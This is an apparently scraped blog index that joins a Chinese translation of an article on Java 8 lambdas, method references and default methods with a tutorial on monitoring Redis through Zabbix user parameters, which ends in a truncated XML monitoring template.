基于词法作用域的理念，lambda表达式不可以掩盖任何其所在上下文中的局部变量，它的行为和那些拥有参数的控制流结构（例如for循环和catch从句）一致。 个人补充：这个说法很拗口，所以我在这里加一个例子以演示词法作用域：12345int i = 0;int sum = 0;for (int i = 1; i &lt; 10; i += 1) { //这里会出现编译错误，因为i已经在for循环外部声明过了 sum += i;} 变量捕获(Variable capture)在Java SE 7中，编译器对内部类中引用的外部变量（即捕获的变量）要求非常严格：如果捕获的变量没有被声明为final就会产生一个编译错误。我们现在放宽了这个限制——对于lambda表达式和内部类，我们允许在其中捕获那些符合有效只读（Effectively final）的局部变量。 简单的说，如果一个局部变量在初始化后从未被修改过，那么它就符合有效只读的要求，换句话说，加上final后也不会导致编译错误的局部变量就是有效只读变量。1234Callable&lt;String&gt; helloCallable(String name) { String hello = \"Hello\"; return () -&gt; (hello + \", \" + name);} 对this的引用，以及通过this对未限定字段的引用和未限定方法的调用在本质上都属于使用final局部变量。包含此类引用的lambda表达式相当于捕获了this实例。在其它情况下，lambda对象不会保留任何对this的引用。 这个特性对内存管理是一件好事：内部类实例会一直保留一个对其外部类实例的强引用，而那些没有捕获外部类成员的lambda表达式则不会保留对外部类实例的引用。要知道内部类的这个特性往往会造成内存泄露。 尽管我们放宽了对捕获变量的语法限制，但试图修改捕获变量的行为仍然会被禁止，比如下面这个例子就是非法的：12int sum = 0;list.forEach(e -&gt; { sum += e.size(); }); 为什么要禁止这种行为呢？因为这样的lambda表达式很容易引起race condition。除非我们能够强制（最好是在编译时）这样的函数不能离开其当前线程，但如果这么做了可能会导致更多的问题。简而言之，lambda表达式对值封闭，对变量开放。 个人补充：lambda表达式对值封闭，对变量开放的原文是：lambda expressions close over values, not variables，我在这里增加一个例子以说明这个特性：12345int sum = 0;list.forEach(e -&gt; { sum += e.size(); }); // Illegal, close over valuesList&lt;Integer&gt; aList = new List&lt;&gt;();list.forEach(e -&gt; { aList.add(e); }); // Legal, open over variables lambda表达式不支持修改捕获变量的另一个原因是我们可以使用更好的方式来实现同样的效果：使用规约（reduction）。java.util.stream包提供了各种通用的和专用的规约操作（例如sum、min和max），就上面的例子而言，我们可以使用规约操作（在串行和并行下都是安全的）来代替forEach：123int sum = list.stream() .mapToInt(e -&gt; e.size()) .sum(); sum()等价于下面的规约操作：123int sum = list.stream() .mapToInt(e -&gt; e.size()) .reduce(0 , (x, y) -&gt; x + y); 规约需要一个初始值（以防输入为空）和一个操作符（在这里是加号），然后用下面的表达式计算结果：10 + list[0] + list[1] + list[2] + ... 规约也可以完成其它操作，比如求最小值、最大值和乘积等等。如果操作符具有可结合性（associative），那么规约操作就可以容易的被并行化。所以，与其支持一个本质上是并行而且容易导致race condition的操作，我们选择在库中提供一个更加并行友好且不容易出错的方式来进行累积（accumulation）。 方法引用(Method references)lambda表达式允许我们定义一个匿名方法，并允许我们以函数式接口的方式使用它。我们也希望能够在已有的方法上实现同样的特性。 方法引用和lambda表达式拥有相同的特性（例如，它们都需要一个目标类型，并需要被转化为函数式接口的实例），不过我们并不需要为方法引用提供方法体，我们可以直接通过方法名称引用已有方法。 以下面的代码为例，假设我们要按照name或age为Person数组进行排序：123456789101112class Person { private final String name; private final int age; public int getAge() { return age; } public String getName() {return name; } ...}Person[] people = ...Comparator&lt;Person&gt; byName = Comparator.comparing(p -&gt; p.getName());Arrays.sort(people, byName); 在这里我们可以用方法引用代替lambda表达式：1Comparator&lt;Person&gt; byName = Comparator.comparing(Person::getName); 这里的Person::getName可以被看作为lambda表达式的简写形式。尽管方法引用不一定（比如在这个例子里）会把语法变的更紧凑，但它拥有更明确的语义——如果我们想要调用的方法拥有一个名字，我们就可以通过它的名字直接调用它。 因为函数式接口的方法参数对应于隐式方法调用时的参数，所以被引用方法签名可以通过放宽类型，装箱以及组织到参数数组中的方式对其参数进行操作，就像在调用实际方法一样：1234Consumer&lt;Integer&gt; b1 = System::exit; // void exit(int status)Consumer&lt;String[]&gt; b2 = Arrays:sort; // void sort(Object[] a)Consumer&lt;String&gt; b3 = MyProgram::main; // void main(String... args)Runnable r = Myprogram::mapToInt // void main(String... args) 方法引用的种类(Kinds of method references)方法引用有很多种，它们的语法如下： 静态方法引用：ClassName::methodName 实例上的实例方法引用：instanceReference::methodName 超类上的实例方法引用：super::methodName 类型上的实例方法引用：ClassName::methodName 构造方法引用：Class::new 数组构造方法引用：TypeName[]::new 对于静态方法引用，我们需要在类名和方法名之间加入::分隔符，例如Integer::sum。 对于具体对象上的实例方法引用，我们则需要在对象名和方法名之间加入分隔符：12Set&lt;String&gt; knownNames = ...Predicate&lt;String&gt; isKnown = knownNames::contains; 这里的隐式lambda表达式（也就是实例方法引用）会从knownNames中捕获String对象，而它的方法体则会通过Set.contains使用该String对象。 有了实例方法引用，在不同函数式接口之间进行类型转换就变的很方便：12Callable&lt;Path&gt; c = ...Privileged&lt;Path&gt; a = c::call; 引用任意对象的实例方法则需要在实例方法名称和其所属类型名称间加上分隔符：1Function&lt;String, String&gt; upperfier = String::toUpperCase; 这里的隐式lambda表达式（即String::toUpperCase实例方法引用）有一个String参数，这个参数会被toUpperCase方法使用。 如果类型的实例方法是泛型的，那么我们就需要在::分隔符前提供类型参数，或者（多数情况下）利用目标类型推导出其类型。 需要注意的是，静态方法引用和类型上的实例方法引用拥有一样的语法。编译器会根据实际情况做出决定。 一般我们不需要指定方法引用中的参数类型，因为编译器往往可以推导出结果，但如果需要我们也可以显式在::分隔符之前提供参数类型信息。 和静态方法引用类似，构造方法也可以通过new关键字被直接引用：1SocketImplFactory factory = MySocketImpl::new; 如果类型拥有多个构造方法，那么我们就会通过目标类型的方法参数来选择最佳匹配，这里的选择过程和调用构造方法时的选择过程是一样的。 如果待实例化的类型是泛型的，那么我们可以在类型名称之后提供类型参数，否则编译器则会依照”菱形”构造方法调用时的方式进行推导。 数组的构造方法引用的语法则比较特殊，为了便于理解，你可以假想存在一个接收int参数的数组构造方法。参考下面的代码：12IntFunction&lt;int[]&gt; arrayMaker = int[]::new;int[] array = arrayMaker.apply(10) // 创建数组 int[10] 默认方法和静态接口方法(Default and static interface methods)lambda表达式和方法引用大大提升了Java的表达能力（expressiveness），不过为了使把代码即数据（code-as-data）变的更加容易，我们需要把这些特性融入到已有的库之中，以便开发者使用。 Java SE 7时代为一个已有的类库增加功能是非常困难的。具体的说，接口在发布之后就已经被定型，除非我们能够一次性更新所有该接口的实现，否则向接口添加方法就会破坏现有的接口实现。默认方法（之前被称为虚拟扩展方法或守护方法）的目标即是解决这个问题，使得接口在发布之后仍能被逐步演化。 这里给出一个例子，我们需要在标准集合API中增加针对lambda的方法。例如removeAll方法应该被泛化为接收一个函数式接口Predicate，但这个新的方法应该被放在哪里呢？我们无法直接在Collection接口上新增方法——不然就会破坏现有的Collection实现。我们倒是可以在Collections工具类中增加对应的静态方法，但这样就会把这个方法置于“二等公民”的境地。 默认方法利用面向对象的方式向接口增加新的行为。它是一种新的方法：接口方法可以是抽象的或是默认的。默认方法拥有其默认实现，实现接口的类型通过继承得到该默认实现（如果类型没有覆盖该默认实现）。此外，默认方法不是抽象方法，所以我们可以放心的向函数式接口里增加默认方法，而不用担心函数式接口的单抽象方法限制。 下面的例子展示了如何向Iterator接口增加默认方法skip：123456789interface Iterator&lt;E&gt; { boolean hasNext(); E next(); void remove(); default void skip(int i) { for ( ; i &gt; 0 &amp;&amp; hasNext(); i -= 1) next(); }} 根据上面的Iterator定义，所有实现Iterator的类型都会自动继承skip方法。在使用者的眼里，skip不过是接口新增的一个虚拟方法。在没有覆盖skip方法的Iterator子类实例上调用skip会执行skip的默认实现：调用hasNext和next若干次。子类可以通过覆盖skip来提供更好的实现——比如直接移动游标（cursor），或是提供为操作提供原子性（Atomicity）等。 当接口继承其它接口时，我们既可以为它所继承而来的抽象方法提供一个默认实现，也可以为它继承而来的默认方法提供一个新的实现，还可以把它继承而来的默认方法重新抽象化。 除了默认方法，Java SE 8还在允许在接口中定义静态方法。这使得我们可以从接口直接调用和它相关的辅助方法（Helper method），而不是从其它的类中调用（之前这样的类往往以对应接口的复数命名，例如Collections）。比如，我们一般需要使用静态辅助方法生成实现Comparator的比较器，在Java SE 8中我们可以直接把该静态方法定义在Comparator接口中：1234public static &lt;T, U extends Comparable&lt;? super U&gt;&gt; Comparator&lt;T&gt; comparing(Function&lt;T, U&gt; keyExtractor) { return (c1, c2) -&gt; keyExtractor.apply(c1).compareTo(keyExtractor.apply(c2));} 继承默认方法(Inheritance of default methods)和其它方法一样，默认方法也可以被继承，大多数情况下这种继承行为和我们所期待的一致。不过，当类型或者接口的超类拥有多个具有相同签名的方法时，我们就需要一套规则来解决这个冲突： 类的方法（class method）声明优先于接口默认方法。无论该方法是具体的还是抽象的。 被其它类型所覆盖的方法会被忽略。这条规则适用于超类型共享一个公共祖先的情况。 为了演示第二条规则，我们假设Collection和List接口均提供了removeAll的默认实现，然后Queue继承并覆盖了Collection中的默认方法。在下面的implement从句中，List中的方法声明会优先于Queue中的方法声明：1class LinkedList&lt;E&gt; implements List&lt;E&gt;, Queue&lt;E&gt; { ... } 当两个独立的默认方法相冲突或是默认方法和抽象方法相冲突时会产生编译错误。这时程序员需要显式覆盖超类方法。一般来说我们会定义一个默认方法，然后在其中显式选择超类方法：123interface Robot implements Artist, Gun { default void draw() { Artist.super.draw(); }} super前面的类型必须是有定义或继承默认方法的类型。这种方法调用并不只限于消除命名冲突——我们也可以在其它场景中使用它。 最后，接口在inherits和extends从句中的声明顺序和它们被实现的顺序无关。 融会贯通(Putting it together)我们在设计lambda时的一个重要目标就是新增的语言特性和库特性能够无缝结合（designed to work together）。接下来，我们通过一个实际例子（按照姓对名字列表进行排序）来演示这一点： 比如说下面的代码：123456List&lt;Person&gt; people = ...Collections.sort(people, new Comparator&lt;Person&gt;() { public int compare(Person x, Person y) { return x.getLastName().compareTo(y.getLastName()); }}) 冗余代码实在太多了！ 有了lambda表达式，我们可以去掉冗余的匿名类：12Collections.sort(people, (Person x, Person y) -&gt; x.getLastName().compareTo(y.getLastName())); 尽管代码简洁了很多，但它的抽象程度依然很差：开发者仍然需要进行实际的比较操作（而且如果比较的值是原始类型那么情况会更糟），所以我们要借助Comparator里的comparing方法实现比较操作：1Collections.sort(people, Comparator.comparing((Person p) -&gt; p.getLastName())); 在类型推导和静态导入的帮助下，我们可以进一步简化上面的代码：1Collections.sort(people, comparing(p -&gt; p.getLastName())); 我们注意到这里的lambda表达式实际上是getLastName的代理（forwarder），于是我们可以用方法引用代替它：1Collections.sort(people, comparing(Person::getLastName)); 最后，使用Collections.sort这样的辅助方法并不是一个好主意：它不但使代码变的冗余，也无法为实现List接口的数据结构提供特定（specialized）的高效实现，而且由于Collections.sort方法不属于List接口，用户在阅读List接口的文档时不会察觉在另外的Collections类中还有一个针对List接口的排序（sort()）方法。 默认方法可以有效的解决这个问题，我们为List增加默认方法sort()，然后就可以这样调用：1people.sort(comparing(Person::getLastName));; 此外，如果我们为Comparator接口增加一个默认方法reversed()（产生一个逆序比较器），我们就可以非常容易的在前面代码的基础上实现降序排序。1people.sort(comparing(Person::getLastName).reversed());; 小结(Summary)Java SE 8提供的新语言特性并不算多——lambda表达式，方法引用，默认方法和静态接口方法，以及范围更广的类型推导。但是把它们结合在一起之后，开发者可以编写出更加清晰简洁的代码，类库编写者可以编写更加强大易用的并行类库。","link":"/2017/04/17/Lambda%E8%AF%AD%E8%A8%80%E7%AF%87%20%E2%80%94%E2%80%94%20lambda,%20%E6%96%B9%E6%B3%95%E5%BC%95%E7%94%A8,%20%E7%9B%AE%E6%A0%87%E7%B1%BB%E5%9E%8B%E5%92%8C%E9%BB%98%E8%AE%A4%E6%96%B9%E6%B3%95/"},{"title":"zabbix监控redis","text":"客户端key配置在安装zabbix客户端的被监控的主机上，新建/etc/zabbix/zabbix_agentd.d/userparameter_redis.conf配置文件，在最后一行加入相应的key/value：1UserParameter=redis_stats[*],redis-cli -h 127.0.0.1 -p $1 info|grep $2|cut -d : -f2 重启服务，应用最新的配置文件，便于zabbix服务端获取数据12#注意确认zabbix_agentd.conf文件UnsafeUserParameters=1 service zabbix-agent restart 服务端校验在zabbix服务端通过zabbix_get程序获取数据，能正常得到客户端数据，证明通信正常。12zabbix_get -s 172.20.0.20 -k redis_stats[6379,total_connections_received]2249669 服务端监控模板导入打开zabbix服务端的可视化界面，点击【configuration】——&gt;【templates】——&gt;【import】，导入redis的监控模板（后文附带）。 服务端添加主机关联模板通过【configuration】——&gt;【hosts】——&gt;【create host】创建新主机，并在templates项中，查找Templates Redis_6379模板，并link该模板。 验证数据使用【monitoring】——&gt;【lastest data】，打开刚刚添加的主机，查看是否有数据。 redis监控模板123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656657658659660661662663664665666667668669670671672673674675676677678679680681682683684685686687688689690691692693694695696697698699700701702703704705706707708709710711712713714715716717718719720721722723724725726727728729730731732733734735736737738739740741742743744745746747748749750751752753754755756757758759760761762763764765766767768769770771772773774775776777778779780781782783784785786787788789790791792793794795796797798799800801802803804805806807808809810811812813814815816817&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;zabbix_export&gt; &lt;version&gt;2.0&lt;/version&gt; &lt;date&gt;2014-02-20T12:21:39Z&lt;/date&gt; &lt;groups&gt; &lt;group&gt; &lt;name&gt;Templates&lt;/name&gt; &lt;/group&gt; &lt;/groups&gt; &lt;templates&gt; &lt;template&gt; &lt;template&gt;Templates Redis_6379&lt;/template&gt; &lt;name&gt;Templates Redis_6379&lt;/name&gt; &lt;groups&gt; &lt;group&gt; &lt;name&gt;Templates&lt;/name&gt; &lt;/group&gt; &lt;/groups&gt; &lt;applications&gt; &lt;application&gt; &lt;name&gt;Redis_6379&lt;/name&gt; &lt;/application&gt; &lt;/applications&gt; &lt;items&gt; &lt;item&gt; &lt;name&gt;Blocked clients_6379&lt;/name&gt; &lt;type&gt;0&lt;/type&gt; &lt;snmp_community/&gt; &lt;multiplier&gt;0&lt;/multiplier&gt; &lt;snmp_oid/&gt; &lt;key&gt;redis_stats[6379,blocked_clients]&lt;/key&gt; &lt;delay&gt;60&lt;/delay&gt; &lt;history&gt;7&lt;/history&gt; &lt;trends&gt;365&lt;/trends&gt; &lt;status&gt;0&lt;/status&gt; &lt;value_type&gt;3&lt;/value_type&gt; &lt;allowed_hosts/&gt; &lt;units/&gt; &lt;delta&gt;0&lt;/delta&gt; &lt;snmpv3_securityname/&gt; &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt; &lt;snmpv3_authpassphrase/&gt; &lt;snmpv3_privpassphrase/&gt; &lt;formula&gt;1&lt;/formula&gt; &lt;delay_flex/&gt; &lt;params/&gt; &lt;ipmi_sensor/&gt; &lt;data_type&gt;0&lt;/data_type&gt; &lt;authtype&gt;0&lt;/authtype&gt; &lt;username/&gt; &lt;password/&gt; &lt;publickey/&gt; &lt;privatekey/&gt; &lt;port/&gt; &lt;description/&gt; &lt;inventory_link&gt;0&lt;/inventory_link&gt; &lt;applications&gt; &lt;application&gt; &lt;name&gt;Redis_6379&lt;/name&gt; &lt;/application&gt; &lt;/applications&gt; &lt;valuemap/&gt; &lt;/item&gt; &lt;item&gt; &lt;name&gt;Connected clients_6379&lt;/name&gt; &lt;type&gt;0&lt;/type&gt; &lt;snmp_community/&gt; &lt;multiplier&gt;0&lt;/multiplier&gt; &lt;snmp_oid/&gt; &lt;key&gt;redis_stats[6379,connected_clients]&lt;/key&gt; &lt;delay&gt;60&lt;/delay&gt; &lt;history&gt;7&lt;/history&gt; &lt;trends&gt;365&lt;/trends&gt; &lt;status&gt;0&lt;/status&gt; &lt;value_type&gt;3&lt;/value_type&gt; &lt;allowed_hosts/&gt; &lt;units/&gt; &lt;delta&gt;0&lt;/delta&gt; &lt;snmpv3_securityname/&gt; &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt; &lt;snmpv3_authpassphrase/&gt; &lt;snmpv3_privpassphrase/&gt; &lt;formula&gt;1&lt;/formula&gt; &lt;delay_flex/&gt; &lt;params/&gt; &lt;ipmi_sensor/&gt; &lt;data_type&gt;0&lt;/data_type&gt; &lt;authtype&gt;0&lt;/authtype&gt; &lt;username/&gt; &lt;password/&gt; &lt;publickey/&gt; &lt;privatekey/&gt; &lt;port/&gt; &lt;description/&gt; &lt;inventory_link&gt;0&lt;/inventory_link&gt; &lt;applications&gt; &lt;application&gt; &lt;name&gt;Redis_6379&lt;/name&gt; &lt;/application&gt; &lt;/applications&gt; &lt;valuemap/&gt; &lt;/item&gt; &lt;item&gt; &lt;name&gt;Connected slave_6380&lt;/name&gt; &lt;type&gt;0&lt;/type&gt; &lt;snmp_community/&gt; &lt;multiplier&gt;0&lt;/multiplier&gt; &lt;snmp_oid/&gt; &lt;key&gt;redis_stats[6379,connected_slave]&lt;/key&gt; &lt;delay&gt;60&lt;/delay&gt; &lt;history&gt;7&lt;/history&gt; &lt;trends&gt;365&lt;/trends&gt; &lt;status&gt;0&lt;/status&gt; &lt;value_type&gt;3&lt;/value_type&gt; &lt;allowed_hosts/&gt; &lt;units/&gt; &lt;delta&gt;0&lt;/delta&gt; &lt;snmpv3_securityname/&gt; &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt; &lt;snmpv3_authpassphrase/&gt; &lt;snmpv3_privpassphrase/&gt; &lt;formula&gt;1&lt;/formula&gt; &lt;delay_flex/&gt; &lt;params/&gt; &lt;ipmi_sensor/&gt; &lt;data_type&gt;0&lt;/data_type&gt; &lt;authtype&gt;0&lt;/authtype&gt; &lt;username/&gt; &lt;password/&gt; &lt;publickey/&gt; &lt;privatekey/&gt; &lt;port/&gt; &lt;description/&gt; &lt;inventory_link&gt;0&lt;/inventory_link&gt; &lt;applications&gt; &lt;application&gt; &lt;name&gt;Redis_6379&lt;/name&gt; &lt;/application&gt; &lt;/applications&gt; &lt;valuemap/&gt; &lt;/item&gt; &lt;item&gt; &lt;name&gt;Connection rate_6379&lt;/name&gt; &lt;type&gt;0&lt;/type&gt; &lt;snmp_community/&gt; &lt;multiplier&gt;0&lt;/multiplier&gt; &lt;snmp_oid/&gt; &lt;key&gt;redis_stats[6379,total_connections_received]&lt;/key&gt; &lt;delay&gt;60&lt;/delay&gt; &lt;history&gt;7&lt;/history&gt; &lt;trends&gt;365&lt;/trends&gt; &lt;status&gt;0&lt;/status&gt; &lt;value_type&gt;3&lt;/value_type&gt; &lt;allowed_hosts/&gt; &lt;units/&gt; &lt;delta&gt;1&lt;/delta&gt; &lt;snmpv3_securityname/&gt; &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt; &lt;snmpv3_authpassphrase/&gt; &lt;snmpv3_privpassphrase/&gt; &lt;formula&gt;1&lt;/formula&gt; &lt;delay_flex/&gt; &lt;params/&gt; &lt;ipmi_sensor/&gt; &lt;data_type&gt;0&lt;/data_type&gt; &lt;authtype&gt;0&lt;/authtype&gt; &lt;username/&gt; &lt;password/&gt; &lt;publickey/&gt; &lt;privatekey/&gt; &lt;port/&gt; &lt;description/&gt; &lt;inventory_link&gt;0&lt;/inventory_link&gt; &lt;applications&gt; &lt;application&gt; &lt;name&gt;Redis_6379&lt;/name&gt; &lt;/application&gt; &lt;/applications&gt; &lt;valuemap/&gt; &lt;/item&gt; &lt;item&gt; &lt;name&gt;Evicted_keys_6379&lt;/name&gt; &lt;type&gt;0&lt;/type&gt; &lt;snmp_community/&gt; &lt;multiplier&gt;0&lt;/multiplier&gt; &lt;snmp_oid/&gt; &lt;key&gt;redis_stats[6379,evicted_keys]&lt;/key&gt; &lt;delay&gt;60&lt;/delay&gt; &lt;history&gt;7&lt;/history&gt; &lt;trends&gt;365&lt;/trends&gt; &lt;status&gt;0&lt;/status&gt; &lt;value_type&gt;3&lt;/value_type&gt; &lt;allowed_hosts/&gt; &lt;units/&gt; &lt;delta&gt;0&lt;/delta&gt; &lt;snmpv3_securityname/&gt; &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt; &lt;snmpv3_authpassphrase/&gt; &lt;snmpv3_privpassphrase/&gt; &lt;formula&gt;1&lt;/formula&gt; &lt;delay_flex/&gt; &lt;params/&gt; &lt;ipmi_sensor/&gt; &lt;data_type&gt;0&lt;/data_type&gt; &lt;authtype&gt;0&lt;/authtype&gt; &lt;username/&gt; &lt;password/&gt; &lt;publickey/&gt; &lt;privatekey/&gt; &lt;port/&gt; &lt;description/&gt; &lt;inventory_link&gt;0&lt;/inventory_link&gt; &lt;applications&gt; &lt;application&gt; &lt;name&gt;Redis_6379&lt;/name&gt; &lt;/application&gt; &lt;/applications&gt; &lt;valuemap/&gt; &lt;/item&gt; &lt;item&gt; &lt;name&gt;Expired keys_6379&lt;/name&gt; &lt;type&gt;0&lt;/type&gt; &lt;snmp_community/&gt; &lt;multiplier&gt;0&lt;/multiplier&gt; &lt;snmp_oid/&gt; &lt;key&gt;redis_stats[6379,expired_keys]&lt;/key&gt; &lt;delay&gt;60&lt;/delay&gt; &lt;history&gt;7&lt;/history&gt; &lt;trends&gt;365&lt;/trends&gt; &lt;status&gt;0&lt;/status&gt; &lt;value_type&gt;3&lt;/value_type&gt; &lt;allowed_hosts/&gt; &lt;units/&gt; &lt;delta&gt;0&lt;/delta&gt; &lt;snmpv3_securityname/&gt; &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt; &lt;snmpv3_authpassphrase/&gt; &lt;snmpv3_privpassphrase/&gt; &lt;formula&gt;1&lt;/formula&gt; &lt;delay_flex/&gt; &lt;params/&gt; &lt;ipmi_sensor/&gt; &lt;data_type&gt;0&lt;/data_type&gt; &lt;authtype&gt;0&lt;/authtype&gt; &lt;username/&gt; &lt;password/&gt; &lt;publickey/&gt; &lt;privatekey/&gt; &lt;port/&gt; &lt;description/&gt; &lt;inventory_link&gt;0&lt;/inventory_link&gt; &lt;applications&gt; &lt;application&gt; &lt;name&gt;Redis_6379&lt;/name&gt; &lt;/application&gt; &lt;/applications&gt; &lt;valuemap/&gt; &lt;/item&gt; &lt;item&gt; &lt;name&gt;Last save time_6379&lt;/name&gt; &lt;type&gt;0&lt;/type&gt; &lt;snmp_community/&gt; &lt;multiplier&gt;0&lt;/multiplier&gt; &lt;snmp_oid/&gt; &lt;key&gt;redis_stats[6379,last_save_time]&lt;/key&gt; &lt;delay&gt;60&lt;/delay&gt; &lt;history&gt;3&lt;/history&gt; &lt;trends&gt;365&lt;/trends&gt; &lt;status&gt;0&lt;/status&gt; &lt;value_type&gt;3&lt;/value_type&gt; &lt;allowed_hosts/&gt; &lt;units&gt;unixtime&lt;/units&gt; &lt;delta&gt;0&lt;/delta&gt; &lt;snmpv3_securityname/&gt; &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt; &lt;snmpv3_authpassphrase/&gt; &lt;snmpv3_privpassphrase/&gt; &lt;formula&gt;1&lt;/formula&gt; &lt;delay_flex/&gt; &lt;params/&gt; &lt;ipmi_sensor/&gt; &lt;data_type&gt;0&lt;/data_type&gt; &lt;authtype&gt;0&lt;/authtype&gt; &lt;username/&gt; &lt;password/&gt; &lt;publickey/&gt; &lt;privatekey/&gt; &lt;port/&gt; &lt;description/&gt; &lt;inventory_link&gt;0&lt;/inventory_link&gt; &lt;applications&gt; &lt;application&gt; &lt;name&gt;Redis_6379&lt;/name&gt; &lt;/application&gt; &lt;/applications&gt; &lt;valuemap/&gt; &lt;/item&gt; &lt;item&gt; &lt;name&gt;port status_6379&lt;/name&gt; &lt;type&gt;0&lt;/type&gt; &lt;snmp_community/&gt; &lt;multiplier&gt;0&lt;/multiplier&gt; &lt;snmp_oid/&gt; &lt;key&gt;net.tcp.listen[6379]&lt;/key&gt; &lt;delay&gt;60&lt;/delay&gt; &lt;history&gt;7&lt;/history&gt; &lt;trends&gt;365&lt;/trends&gt; &lt;status&gt;0&lt;/status&gt; &lt;value_type&gt;3&lt;/value_type&gt; &lt;allowed_hosts/&gt; &lt;units/&gt; &lt;delta&gt;0&lt;/delta&gt; &lt;snmpv3_securityname/&gt; &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt; &lt;snmpv3_authpassphrase/&gt; &lt;snmpv3_privpassphrase/&gt; &lt;formula&gt;1&lt;/formula&gt; &lt;delay_flex/&gt; &lt;params/&gt; &lt;ipmi_sensor/&gt; &lt;data_type&gt;0&lt;/data_type&gt; &lt;authtype&gt;0&lt;/authtype&gt; &lt;username/&gt; &lt;password/&gt; &lt;publickey/&gt; &lt;privatekey/&gt; &lt;port/&gt; &lt;description/&gt; &lt;inventory_link&gt;0&lt;/inventory_link&gt; &lt;applications&gt; &lt;application&gt; &lt;name&gt;Redis_6379&lt;/name&gt; &lt;/application&gt; &lt;/applications&gt; &lt;valuemap/&gt; &lt;/item&gt; &lt;item&gt; &lt;name&gt;Request rate_6379&lt;/name&gt; &lt;type&gt;0&lt;/type&gt; &lt;snmp_community/&gt; &lt;multiplier&gt;0&lt;/multiplier&gt; &lt;snmp_oid/&gt; &lt;key&gt;redis_stats[6379,total_commands_processed]&lt;/key&gt; &lt;delay&gt;60&lt;/delay&gt; &lt;history&gt;7&lt;/history&gt; &lt;trends&gt;365&lt;/trends&gt; &lt;status&gt;0&lt;/status&gt; &lt;value_type&gt;3&lt;/value_type&gt; &lt;allowed_hosts/&gt; &lt;units/&gt; &lt;delta&gt;1&lt;/delta&gt; &lt;snmpv3_securityname/&gt; &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt; &lt;snmpv3_authpassphrase/&gt; &lt;snmpv3_privpassphrase/&gt; &lt;formula&gt;1&lt;/formula&gt; &lt;delay_flex/&gt; &lt;params/&gt; &lt;ipmi_sensor/&gt; &lt;data_type&gt;0&lt;/data_type&gt; &lt;authtype&gt;0&lt;/authtype&gt; &lt;username/&gt; &lt;password/&gt; &lt;publickey/&gt; &lt;privatekey/&gt; &lt;port/&gt; &lt;description/&gt; &lt;inventory_link&gt;0&lt;/inventory_link&gt; &lt;applications&gt; &lt;application&gt; &lt;name&gt;Redis_6379&lt;/name&gt; &lt;/application&gt; &lt;/applications&gt; &lt;valuemap/&gt; &lt;/item&gt; &lt;item&gt; &lt;name&gt;Role_6379&lt;/name&gt; &lt;type&gt;0&lt;/type&gt; &lt;snmp_community/&gt; &lt;multiplier&gt;0&lt;/multiplier&gt; &lt;snmp_oid/&gt; &lt;key&gt;redis_stats[6379,role]&lt;/key&gt; &lt;delay&gt;60&lt;/delay&gt; &lt;history&gt;3&lt;/history&gt; &lt;trends&gt;365&lt;/trends&gt; &lt;status&gt;0&lt;/status&gt; &lt;value_type&gt;1&lt;/value_type&gt; &lt;allowed_hosts/&gt; &lt;units/&gt; &lt;delta&gt;0&lt;/delta&gt; &lt;snmpv3_securityname/&gt; &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt; &lt;snmpv3_authpassphrase/&gt; &lt;snmpv3_privpassphrase/&gt; &lt;formula&gt;1&lt;/formula&gt; &lt;delay_flex/&gt; &lt;params/&gt; &lt;ipmi_sensor/&gt; &lt;data_type&gt;0&lt;/data_type&gt; &lt;authtype&gt;0&lt;/authtype&gt; &lt;username/&gt; &lt;password/&gt; &lt;publickey/&gt; &lt;privatekey/&gt; &lt;port/&gt; &lt;description/&gt; &lt;inventory_link&gt;0&lt;/inventory_link&gt; &lt;applications&gt; &lt;application&gt; &lt;name&gt;Redis_6379&lt;/name&gt; &lt;/application&gt; &lt;/applications&gt; &lt;valuemap/&gt; &lt;/item&gt; &lt;item&gt; &lt;name&gt;Uptime in seconds_6379&lt;/name&gt; &lt;type&gt;0&lt;/type&gt; &lt;snmp_community/&gt; &lt;multiplier&gt;0&lt;/multiplier&gt; &lt;snmp_oid/&gt; &lt;key&gt;redis_stats[6379,uptime_in_seconds]&lt;/key&gt; &lt;delay&gt;60&lt;/delay&gt; &lt;history&gt;7&lt;/history&gt; &lt;trends&gt;365&lt;/trends&gt; &lt;status&gt;0&lt;/status&gt; &lt;value_type&gt;3&lt;/value_type&gt; &lt;allowed_hosts/&gt; &lt;units&gt;uptime&lt;/units&gt; &lt;delta&gt;0&lt;/delta&gt; &lt;snmpv3_securityname/&gt; &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt; &lt;snmpv3_authpassphrase/&gt; &lt;snmpv3_privpassphrase/&gt; &lt;formula&gt;1&lt;/formula&gt; &lt;delay_flex/&gt; &lt;params/&gt; &lt;ipmi_sensor/&gt; &lt;data_type&gt;0&lt;/data_type&gt; 